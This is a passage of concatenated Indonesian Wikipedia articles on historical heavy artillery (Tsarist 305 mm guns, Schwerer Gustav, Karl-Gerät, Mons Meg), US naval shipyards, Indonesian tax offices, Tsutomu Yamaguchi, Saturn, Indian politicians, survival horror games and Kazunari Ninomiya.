Revolusi 1917 dan berakhirnya Perang Dunia I secara tiba-tiba bagi Rusia membuat persenjataan berat ini tidak lagi digunakan. Akan tetapi, 30 meriam yang disimpan oleh Tentara Merah menjadi dasar rancangan meriam 305 mm Soviet yang kemudian dipasang pada benteng-benteng dan pangkalan pertahanan Angkatan Laut Rusia.

Kekuatan persenjataan ini digunakan untuk menahan pasukan Hitler pada September 1941, ketika berondongan dari delapan meriam 305 mm itu berhasil menghentikan serangan Jerman di Sevastopol. Ditembakkan dari jarak 44 kilometer, senjata ini dapat menahan segala tembakan balasan. Meriam ini juga digunakan untuk mempertahankan posisi di sekitar Leningrad, yang tidak pernah dapat dikuasai oleh pasukan Jerman.

Meriam-meriam Tsar yang tua disebar menjadi lima divisi dengan daya ledak istimewa dan digunakan di baris depan peperangan pada 1944. Periode kejayaannya adalah ketika Soviet menyerang Karelia, Belarus, dan Polandia, dimana pertahanan musuh dikonsentrasikan dalam serangkaian barisan pasukan yang diperkuat dan kota-kota benteng.

Sebuah divisi meriam dibentuk untuk mendukung tank dan pasukan angkatan laut yang ditugaskan untuk menembus zona berbenteng Finlandia di sepanjang Garis Mannerheim, yang pernah diserang oleh tentara Soviet dan menelan korban jiwa sangat banyak selama beberapa bulan pada musim dingin 1939 – 1940.

Kehebatan meriam 305 mm Rusia juga dirasakan oleh pangkalan-pangkalan lapis beton Jerman di Sungai Oder yang diperkirakan oleh para petinggi Nazi akan cukup untuk menahan serangan Soviet. Pada April 1945, meriam berat ini juga terlibat dalam serangan terhadap Berlin.

Namun, pencapaian tertinggi meriam Tsar ini adalah saat operasi menguasai benteng raksasa Reich Ketiga di Königsberg (sekarang Kaliningrad), dengan tiga divisi artileri berat meluncurkan lebih dari 200 tembakan langsung pada benteng itu. Meski hanya 15 persen selongsong yang dapat menembus lapisan beton bangunan itu, serangan ini cukup untuk memecah pertahanan Jerman.

Setelah diproduksi dengan standar perakitan yang tinggi, meriam-meriam tua ini terus digunakan di artileri Soviet untuk waktu yang lama setelah Perang Dunia II. Unit terakhirnya ditarik baru pada akhir 1950-an dan salah satunya kini dipajang di Museum Artileri Saint Peterburg.



</doc>
<doc id="1758251" url="https://id.wikipedia.org/wiki?curid=1758251" title="Schwerer Gustav">
Schwerer Gustav

Schwerer Gustav (bahasa Inggris: Heavy Gustaf atau Great Gustaf) adalah nama senjata api 80 cm Jerman. Ini dikembangkan pada tahun 1930-an oleh Krupp sebagai artileri pengepungan untuk tujuan eksplisit menghancurkan benteng utama dari French Maginot Line, benteng terkuat yang pernah ada. Meriam sepenuhnya dirakit beratnya hampir 1.350 ton, dan bisa menembakkan peluru seberat tujuh ton ke berbagai 47 kilometer (29 mil).

Gustav hancur menjelang akhir perang pada tahun 1945 untuk menghindari penangkapan oleh Tentara Merah.

Meriam ini adalah kaliber senjata terbesar yang pernah digunakan dalam pertempuran, artileri bergerak terberat yang pernah dibangun dalam hal berat keseluruhan, dan menembakkan peluru terberat setiap bagian artileri. Meriam ini hanya dilampaui dalam kaliber oleh Mallet's Mortar British dan mortir Amerika Little David (keduanya 36 inci; 914 mm).



</doc>
<doc id="1758258" url="https://id.wikipedia.org/wiki?curid=1758258" title="Karl-Gerät">
Karl-Gerät

""Karl-Gerät"" (Secara harfiah berarti "Peralatan-Karl"), juga dikenal sebagai Thor dan Karl Mörser, adalah mortir (Mörser) serbu swa-gerak yang dirancang dan dibangun oleh Rheinmetall. Hanya tujuh mortar yang berhasil dibuat, dan digunakan untuk menghancurkan benteng Soviet di Brest-Litovsk dan Sevastopol, membombardir milisi Polandia selama Pemberontakan Warsawa, dan ikut dalam Pertempuran Wacht am Rhein/Pertempuran Bulge.

Munisi terberatnya adalah peluru 60 cm seberat 2.170 kg. Peluru ringannya seberat 1.250 kg dan bisa menjangkau sasaran yang jaraknya lebih dari 10 km. Setiap mortir besar ini harus disertai dengan penderek, trailer transportasi berat, dan beberapa tank yang dimodifikasi untuk membawa munisi.



</doc>
<doc id="1758260" url="https://id.wikipedia.org/wiki?curid=1758260" title="Mons Meg">
Mons Meg

Mons Meg adalah bombardir abad pertengahan yang terletak di Edinburgh Castle, Skotlandia. Dibangun pada 1449 atas perintah Philip the Good, Duke of Burgundy dan dikirim oleh dia sebagai hadiah untuk Raja James II dari Skotlandia pada 1454.

Bombardir itu digunakan dalam pengepungan sampai pertengahan abad ke-16, setelah itu hanya menembak pada kesempatan upacara.

Mons Meg memiliki kaliber (barrel diameter) dari 20 inci (510 mm), membuatnya menjadi salah satu meriam terbesar di dunia dengan kaliber. Meriam merupakan bagian dari koleksi Royal Armouries, dipinjamkan ke Historic Scotland yang mengelola Edinburgh Castle.



</doc>
<doc id="1758262" url="https://id.wikipedia.org/wiki?curid=1758262" title="Obusier de 520 modèle 1916">
Obusier de 520 modèle 1916

Obusier de 520 modele 1916 adalah sebuah meriam kereta api Perancis yang dibangun selama Perang Dunia I, tetapi tidak memasuki dinas sebelum perang berakhir. Satu meriam tertangkap oleh Jerman setelah Perancis menyerah pada tahun 1940 dan digunakan oleh mereka dalam Pengepungan Leningrad. Kedua senjata hancur oleh ledakan prematur peluru di dalam larasnya.

Howitzer ini dipesan pada tahun 1916 dari Schneider, tetapi pengembangan mengalami penundaan dan meriam pertama baru dapat dikirim pada akhir 1917. Meriam ini menggunakan kombinasi mekanisme tolak balik sanggaan dan geser untuk menahan gaya tolak balik dari penembakannya. Sejumlah batang besi dipasang pada bagian bawah kereta pembawa diturunkan dan dikunci pada rel kereta untuk meningkatkan gaya gesek ketika kereta pembawa terdorong ke belakang sejauh 1 meter akibat gaya tolak balik yang tidak sepenuhnya terserap oleh penahan hidrolik pada penyangga meriam. Meriam ini harus diisi ulang pada elevasi 0° dan maka harus dibidik ulang untuk setiap tembakan. Sebuah sistem troli dipasang pada bagian belakang meriam untuk membawa amunisi dari mobil amunisi ke sungsang meriam. Pelurunya memiliki berat 1.370 dan 1.654 kg. Pengendalian elevasi dan amunisi ditenagai oleh listrik dari generator terpisah yang dihubungkan dengan kabel sepanjang 10 meter.

Howitzer pertama hancur selama uji tembak di Quiberon pada Juli 1918 ketika sebuah peluru meledak secara prematur di dalam laras. Meriam kedua dikirim pada 1918, tetapi belum melengkapi uji tembaknya sebelum perang berakhir. Meriam ini kemudian disimpan, namun bukan merupakan bagian dari rencana mobilisasi Perancis sehingga perlu diperbaiki sebelum bisa digunakan dalam pertempuran. Meriam ini ditangkap oleh Jerman di bengkel Schneider sebelum sempat menembakkan pelurunya.

Jerman menempatkannya dalam dinas sebagai "52 cm Haubitze (E) 871(f)" dan ditugaskan pada Baterai Artileri Kereta Api "(Artillerie-Batterie (E.)) 686". Meriam ini tidak berpartisipasi dalam bagian pembuka Operasi Barbarossa, tetapi tiba di pinggiran Leningrad pada 21 November 1941. Howitzer ini hancur ketika sebuah peluru meledak di dalam larasnya pada 5 Januari 1942. Rongsokan yang ditinggalkan lalu ditangkap oleh Soviet pada Operasi Iskra di tahun 1943.



</doc>
<doc id="1758265" url="https://id.wikipedia.org/wiki?curid=1758265" title="Norfolk Naval Shipyard">
Norfolk Naval Shipyard

Norfolk Naval Shipyard, sering disebut Norfolk Navy Yard dan disingkat NNSY, adalah fasilitas Angkatan Laut AS di Portsmouth, Virginia, untuk membangun, renovasi, dan memperbaiki kapal Angkatan Laut. Ini adalah fasilitas industri tertua dan terbesar yang dimiliki oleh Angkatan Laut Amerika Serikat serta yang paling beragam. Terletak di Sungai Elizabeth, dekat dengan Hampton Roads.

Galangan ini didirikan sebagai Gosport Shipyard di 1767. Hancur selama Perang Revolusi Amerika, dibangun kembali dan menjadi rumah bagi drydock operasional pertama di Amerika Serikat pada 1820-an. Berpindah tangan selama Perang Saudara Amerika, galangan itu menjabat Confederate States Navy sampai itu dihancurkan lagi pada tahun 1862, ketika diberi nama saat ini. Galangan kapal itu lagi dibangun kembali, dan terus beroperasi sampai hari ini.



</doc>
<doc id="1758266" url="https://id.wikipedia.org/wiki?curid=1758266" title="Brooklyn Navy Yard">
Brooklyn Navy Yard

United States Navy Yard, juga dikenal sebagai Brooklyn Navy Yard dan New York Naval Shipyard (NYNSY), adalah galangan kapal yang terletak di Brooklyn, New York, 1,7 mil (2,7 km) timur laut dari Baterai di East River di Wallabout Basin, tikungan setengah lingkaran dari sungai di seberang dari Corlear's Hook di Manhattan.

Galangan itu dibatasi oleh Navy Street, Flushing dan Kent Avenues, dan pada puncak produksi kapal perang untuk Angkatan Laut Amerika Serikat, menutupi lebih dari 200 hektar (0,81 km2).



</doc>
<doc id="1758267" url="https://id.wikipedia.org/wiki?curid=1758267" title="Philadelphia Naval Shipyard">
Philadelphia Naval Shipyard

Navy Yard, sebelumnya dikenal sebagai Philadelphia Naval Shipyard dan Philadelphia Naval Business Center, adalah galangan kapal angkatan laut dari Amerika Serikat selama lebih dari satu abad. Sekarang menjadi kawasan industri besar yang mencakup galangan kapal komersial, Aker Philadelphia Shipyard.

Philadelphia aslinya galangan angkatan laut, dimulai pada tahun 1776 di Front Street di tempat yang sekarang City Center, adalah galangan kapal angkatan laut pertama Amerika Serikat. Yng baru, galangan yang jauh lebih besar tumbuh di sekitar fasilitas dimulai pada tahun 1871 di Pulau Champions di pertemuan Sungai Delaware dan Schuylkill Rivers.

Angkatan Laut Amerika Serikat mengakhiri sebagian besar kegiatan di sana pada 1990-an, dan pada tahun 2000, kota Philadelphia mengambil alih dan mulai membangun kembali tanah. Angkatan Laut masih memiliki Naval Inactive Ship Maintenance Facility dan beberapa kegiatan rekayasa di situs.



</doc>
<doc id="1758272" url="https://id.wikipedia.org/wiki?curid=1758272" title="Kantor Wilayah DJP Jawa Tengah I">
Kantor Wilayah DJP Jawa Tengah I

Kantor Wilayah DJP Jawa Tengah I adalah unit vertikal Direktorat Jenderal Pajak di daerah yang membawai beberapa Kantor Pelayanan Pajak Pratama dan sebuah Kantor Pelayanan Pajak Madya.

Wilayah kerja Kantor Wilayah DJP Jawa Tengah I ( Kanwil DJP Jateng I ) meliputi seluruh wilayah administratif ;

Kanwil DJP Jateng I membawai 16 Kantor Pelayanan Pajak yaitu ;




</doc>
<doc id="1758273" url="https://id.wikipedia.org/wiki?curid=1758273" title="Tsutomu Yamaguchi">
Tsutomu Yamaguchi

Seorang penduduk di Nagasaki, Yamaguchi berada di Hiroshima untuk tujuan bisnis perusahaannya Mitsubishi Heavy Industries ketika kota tersebut dibom pada pukul 8:15 am, pada 6 Agustus 1945. Ia kembali ke Nagasaki pada hari berikutnya, dan meskipun ia mengalami luka-luka, ia kembali bekerja pada 9 Agustus, hari pengeboman atom keduanya. Pada 1957, ia diangkat sebagai hibakusha ("orang yang terkena ledakan") pada pengeboman Nagasaki, namun hal tersebut tidak sampai 24 Maret 2009, ketika pemerintah Jepang secara resmi mengakui keberadaannya di Hiroshima tiga hari sebelumnya. Ia meninggal karena kanker lambung pada 4 Januari 2010, pada usia 93 tahun.

Yamaguchi lahir pada 16 Maret 1916. Ia bergabung dengan Mitsubishi Heavy Industries pada 1930an dan bekerja sebagai pengrajin yang merancang tangki-tangki minyak.

Istrinya juga mengalami keracunan radiasi dari hujan hitam setelah peledakan Nagasaki dan meninggal pada 2010 (usia 93 tahun) karena kanker ginjal dan kanker hati setelah sepanjang hidupnya sakit. Seluruh tiga anak mereka dikabarkan mengalami masalah kesehatan yang mungkin berhubungan dengan efek dari ledakan yang dialami orangtuanya.

Pada 2009, Yamaguchi mengetahui bahwa ia mengalami kanker lambung. Ia meninggal pada 4 Januari 2010 di Nagasaki pada usia 93 tahun.




</doc>
<doc id="1758274" url="https://id.wikipedia.org/wiki?curid=1758274" title="Puccinia">
Puccinia

Puccinia adalah salah satu marga cendawan yang semua anggotanya adalah patogen tanaman dan gejalanya dikenal sebagai karat (daun), karena ciri khasnya berupa bercak berwarna coklat kemerahan dan terasa kasar seperti karat Anggotanya ada sekitar 4000 jenis (spesies).

Contoh-contoh jenis "Puccinia" yang penting dan penyakit yang disebabkannya adalah sebagai berikut.



</doc>
<doc id="1758276" url="https://id.wikipedia.org/wiki?curid=1758276" title="Kantor Pelayanan Pajak Pratama Demak">
Kantor Pelayanan Pajak Pratama Demak

Kantor Pelayanan Pajak Pratama Demak adalah unit vertikal Direktorat Jenderal Pajak di daerah yang melaksanakan penyuluhan, pelayanan, dan pengawasan kepada wajib pajak, berdasarkan segmentasi wajib pajak yang diadministrasikannya: Wajib Pajak Orang Pribadi dan Badan dengan tingkat omset tertentu di luar yang diadministrasikan oleh Kantor Pelayanan Pajak Wajib Pajak Besar, Khusus, dan Madya, di wilayah kerjanya.

Wilayah kerja Kantor Pelayanan Pajak Pratama Demak ( KPP Pratama Demak ) meliputi seluruh wilayah administratif Kabupaten Demak.

Motto Kantor Pelayanan Pajak Pratama Demak adalah: "Amor Demak Nostra Lex" yang artinya "Mencintai Demak adalah hukum kita"




</doc>
<doc id="1758278" url="https://id.wikipedia.org/wiki?curid=1758278" title="Saturnus (mitologi)">
Saturnus (mitologi)

Saturnus adalah seorang dewa dalam agama Romawi kuno, dan sebuah karakter dalam mitos. Saturnus adalah sebuah figur kompleks karena keterikatan gandanya dan sejarah panjangnya. Ia adalah dewa pertama dari Capitol, yang dikenal sejak zaman-zaman paling kuno dengan nama "Saturnius Mons", dan dipandang sebagai dewa generasi, pembubaran, plenty, kesejahteraan, agribudaya, pembaharuan periodik dan pembebasan. Pada perkembangan selanjutnya, ia juga dijadikan dewa waktu. Masa pemerintahannya digambarkan sebagai Abad Keemasan plenty dan perdamaian. Kuil Saturnus di Forum Romawi menyimpan harta karun negara tersebut. Pada bulan Desember, ia dirayakan pada perayaan Romawi paling terkenal, Saturnalia. Planet Saturnus dan Sabtu ("Saturday") dinamai dari nama dewa tersebut.









</doc>
<doc id="1758284" url="https://id.wikipedia.org/wiki?curid=1758284" title="Vasundhara Raje">
Vasundhara Raje

Vasundhara Raje Scindia (kelahiran 8 Maret 1953), yang umumnya disebut sebagai Vasundhara Raje adalah seorang politikus India yang menjadi Ketua Menteri Rajasthan sejak 2013; sebelumnya ia menjabat pada jabatan yang sama dari 2003 sampai 2008. Ia adalah Ketua Menteri Rajasthan perempuan pertama.

Vasundhara Raje lahir pada 8 Maret 1953 di Mumbai. Ia adalah putri dari Vijayaraje Scindia dan Jivajirao Scindia, Maharaja Gwalior, anggota keluarga Maratha kerajaan Scindia yang berpengaruh. Ia menyelesaikan pendidikan sekolahnya dari Presentation Convent, Kodaikanal, Tamil Nadu, dan kemudian lulus dengan gelar Ekonomi dan Ilmu Pengetahuan Politik (Kehormatan) dari Kolese Sophia, yang berafiliasi dengan Universitas Mumbai, Mumbai.

Vasundhara Raje menikah dengan Hemant Singh, seorang anggota keluarga eks-kerajaan Dholpur, pada 17 November 1972, tetapi pasangan tersebut berpisah setahun kemudian. Putranya Dushyant Singh terpilih pada Lok Sabha dari bekas konstituensinya, Jhalawar.

Saudaranya adalah Yashodhara Raje Scindia, menteri Industri Madhya Pradesh, kemudian Madhavrao Scindia, kemudian Padmavati Raje 'Akkasaheb' Burman (1942–64), yang menikah dengan Kirit Deb Burman, Maharaja Tripura terakhir, dan Usha Raje Rana (b. 1943) yang menikah denghan keluarga Nepal Rana.






</doc>
<doc id="1758287" url="https://id.wikipedia.org/wiki?curid=1758287" title="Planet klasik">
Planet klasik

Pada zaman kuno, planet klasik adalah tujuh objek non-fixed objects yang terlihat di langit. Planet klasik tersebut adalah Matahari dan Bulan dan lima planet Merkurius, Venus, Mars, Jupiter, dan Saturnus. Nama planet berasal dari istilah Yunani πλανήτης, "planētēs". Ketujuhnya disebut tujuh planet klasik atau "7 planet zaman kuno". Uranus sebetulnya juga dapat dilihat dengan nama telanjang saat malam yang cerah, namun tidak diidentifikasi sebagai sebuah planet sampai zaman modern.

Bangsa Babilonia mengesahkan tujuh planet. Sebuah daftar dwibahasa dalam catatan Museum Britania tentang tujuh planet Babilonia dalam rangkaian ini:



</doc>
<doc id="1758292" url="https://id.wikipedia.org/wiki?curid=1758292" title="Meriam 16&quot;/ kaliber 50 Mark 7">
Meriam 16&quot;/ kaliber 50 Mark 7

Meriam 16"/ kaliber 50 Mark 7 adalah persenjataan utama dari kapal tempur kelas Iowa.

Senjata ini memiliki panjang 66,6 kaki (20 m), bore 16-inch (406 mm), atau kaliber 50, dari breechface. Setiap senjata beratnya sekitar £ 239.000 (108.000 kg) tanpa sungsang, atau £ 267.900 (121.517 kg) dengan sungsang. Meriam ini dapat menembakkan proyektil berat dari 1.900 sampai 2.700 pound (850 kg untuk 1.200) pada kecepatan maksimum 2.690 kaki per detik (820 m / s) dengan jangkauan hingga 24 mil (39 km).

Pada jangkauan maksimum proyektil menghabiskan hampir 1 ½ menit dalam penerbangannya. Setiap turet memerlukan awak 79 orang untuk beroperasi. Menara turetnya sendiri berbiaya US $ 1,4 juta masing-masing.

Menara turet berlaras tiga, namun, setiap barelnya bisa naik dan ditembakkan secara independen.



</doc>
<doc id="1758294" url="https://id.wikipedia.org/wiki?curid=1758294" title="MI Salafiyah Gapuro Warungasem">
MI Salafiyah Gapuro Warungasem

"MI Salafiyah Gapuro" Merupakan sebuah lembaga pendidikan swasta setingkat sekolah dasar yang terletak di Jalan Raya Gapuro No. 60 Warungasem Batang. Madrasah ini sudah berdiri sejak tanggal 27 Februari 1960. Pada awal berdirinya Madrasah ini diberi nama MINU (Madrasah Ibtidaiyah Nahdhotul Ulama). Saat sekarang ini MI Salafiyah Gapuro telah meluluskan alumni sekitar 2500 siswa. Pada tahun 2011 MI Salafiyah Gapuro ditunjuk sebagai Madrasah Percontohan di Kabupaten Batang dengan diterbitkan SK Bupati Batang No. 890/177/2011.(dok.Madrasah), 2011. Pada Tahun yang bersamaan tepatnya dibulan September MI Salafiyah Gapuro Terakreditasi A oleh Badan Akreditasi Nasional/ BAN S/M No. 35-BAN-2011. Sejak berdirinya sampai sekarang sudah mengalami pergantian Kepala Madrasah diantarannya: Bapak KH. Hasyim, Bpk. Mustain, Bpk. Slamet, A.Ma, Bpk. Zaenudin,S.Pd.I dan dari tahun 2011 sampai sekarang dipegang oleh Bpk. Sirojul Huda,M.S.I. Sarana yang ada di MI Salafiyah Gapuro meliputi Sarana Ruang Belajar yang Representatif sebanyak 12 ruang, Sarana Olahraga, ruang UKS, Ruang Komputer dan Lab. IPA. Adapun untuk kegiatan ektra kurikuler yang ada meliputi Ektra Tilawatil Qur'an, TIK, Rebana, Pramuka, UKS dan Marching band. Untuk tahun 2014 murid MI salafiyah Gapuro berjumlah 265 siswa yang berasal dari Kota Pekalongan, kab. Pekalongan dan kab. Batang.



</doc>
<doc id="1758297" url="https://id.wikipedia.org/wiki?curid=1758297" title="Daftar Ketua Menteri Jharkhand">
Daftar Ketua Menteri Jharkhand

Ketua Menteri Jharkhand adalah ketua eksekutif dari negara bagian timur India Jharkhand. Sesuai dengan Konstitusi India, gubernur adalah seorang kepala "de jure" negara bagian, namun otoritas eksekutif "de facto" dipegang ketua menteri. Setelah pemilihan-pemilihan dari Mahkamah Legislatif Jharkhand, gubernur negara bagian tersebut biasanya mengundang partai (atau koalisi) dengan mayoritas kursi dari bentuk pemerintahan tersebut. Gubernur yang melantik ketua menteri, di mana dewan menteri menjadi penanggung jawab kolektif dari mahkamah tersebut. Memberikannya kepercayaan dari mahkamah tersebut, masa jabatan ketua menteri biasanya paling lama lima tahun; tidak ada batas-batas untuk jumlah masa jabatan yang ia dapat jabati.

Sejak pembentukan Jharkhand pada 2000, ketika wilayah tersebut melepaskan diri dari distrik-distrik selatan perbukitan Bihar, enam orang telah menjabat sebagai ketua menteri negara bagian tersebut, setengah diantaranya berasal dari Partai Bharatiya Janata (PBJ), termasuk Babulal Marandi, pemegang jabatan pertamanya. Anggota separtainya Arjun Munda adalah ketua menteri yang paling lama menjabat selama lebih dari lima tahun pada tiga masa jabatan. Dua ketua menteri berasal dari Jharkhand Mukti Morcha (JMM), yang dinamai oleh Shibu Soren dan putranya Hemant Soren. Negara bagian tersebut juga pernah diperintah oleh independen, Madhu Koda. Pada antara masa jabatan mereka, negara bagian tersebut juga berada di bawah pemerintahan presiden.

Raghubar Das dari PBJ adalah ketua menteri petahana, setelah pelantikannya pada 28 Desember 2014.



</doc>
<doc id="1758306" url="https://id.wikipedia.org/wiki?curid=1758306" title="Horor kesintasan">
Horor kesintasan

Horor kesintasan (Inggris: "survival horror") merupakan salah satu subragam dalam permainan video yang diilhami oleh fiksi horor. Ragam ini berpusat pada tingkat ketahanan atau kesintasan pemain saat permainan mencoba menakuti para pemain.

Istilah horor kesintasan pertama kali digunakan pada tahun 1996 untuk permainan "Resident Evil". Resident Evil sendiri dipengaruhi oleh permainan dengan ragam yang sama dan diluncurkan pada tahun 1989 dengan judul "Sweet Home".


</doc>
<doc id="1758310" url="https://id.wikipedia.org/wiki?curid=1758310" title="Meriam Oerlikon 20 mm">
Meriam Oerlikon 20 mm

Meriam Oerlikon 20 mm adalah serangkaian meriam otomatis, didasarkan pada desain Becker 20 mm dari Jerman yang muncul pada sangat awal dalam Perang Dunia I.

Meriam ini banyak diproduksi oleh Oerlikon Contraves dan lain-lain, dengan berbagai model yang digunakan oleh Sekutu dan pasukan Axis selama Dunia perang II, dan banyak versi masih digunakan sampai sekarang.




</doc>
<doc id="1758315" url="https://id.wikipedia.org/wiki?curid=1758315" title="Kazunari Ninomiya">
Kazunari Ninomiya

, atau biasa dipanggil , adalah seorang Idola Jepang, penyanyi, penulis lagu, aktor, Pengisi suara and Host radio. Ia adalah salah satu anggota dari boyband Jepang Arashi bersama dengan Sho Sakurai, Satoshi Ohno, Jun Matsumoto dan Masaki Aiba. Ia mulai dikenal oleh semua orang berkat perannya sebagai Private Saigo dalam film perang yang disutradarai Clint Eastwood tahun 2006 "Letters from Iwo Jima".

Nino memulai kariernya di dunia entertainment ketika ia bergabung dengan agensi ternama Jepang Johnny & Associates pada tahun 1996 pada umur . Sebelum debut sebagai penyanyi dalam boyband Arashi pada tahun 1999, Nino sudah memulai kariernya sebagai aktor dengan berperan dalam cerita sandiwara "Stand by Me", yang merupakan adaptasi dari film dengan judul yang sama. Sejak saat itu, ia mulai tampil di berbagai drama, film, dan produksi panggung, yang membuatnya dikenal sebagai aktor di Arashi. Ninomiya telah memenangkan berbagai penghargaan dan nominasi untuk peran-perannya.

Nino lahir di Katsushika, Tokyo sebagai anak terakhir dalam keluarganya. Ayah dan ibunya bekerja sebagai chef ketika mereka bertemu. Ketika Nino lahir, kakeknya langsung pulang ke rumah dan menamainya sebagai pewaris keluarga karena ia adalah satu-satunya cucu kakeknya. Lalu, ketika Nino berumur 12 tahun, sepupunya mengirim surat lamaran ke Johnny & Associates tanpa sepengetahuan dirinya. Setelah menghadiri dan berhasil lulus audisi, berkat dorongan ibunya, Nino bergabung dengan Johnny & Associates.

Nino lulus dari sekolah pada Maret 2002 diumurnya yang ke-18 tahun. Namun, ia tidak memilih melanjutkan ke jenjang universitas, seperti Sho Sakurai. Ia lebih memilih untuk menekuni kariernya saat itu.



</doc>
